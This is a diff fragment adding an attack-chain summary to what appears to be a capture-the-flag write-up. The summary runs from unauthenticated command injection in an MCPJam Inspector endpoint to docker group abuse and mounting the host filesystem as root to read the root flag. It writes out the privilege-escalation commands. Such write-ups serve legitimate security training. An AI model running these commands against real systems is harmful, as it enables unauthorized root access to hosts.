@@ -169,3 +169,23 @@ eb99819216e6d4cd094060651f909b1f
 
 The container was running as a non-root user by default. Forcing `--user root` made it run as root inside the container, giving full access to the mounted host filesystem.
 
+```
+1. MCPJam Inspector /api/mcp/connect (no auth)
+   → RCE as ben via command/args injection
+            ↓
+2. Enumerated internally
+   → Found Arcane on port 3552
+   → Found /privatebin-data (operator group)
+            ↓
+3. newgrp docker (no password needed)
+   → Temporarily joined docker group
+            ↓
+4. docker run -v /:/hostfs --user root
+   → Mounted host filesystem as root
+            ↓
+5. cat /hostfs/root/root.txt
+   → ROOT FLAG
+```
+
+
+
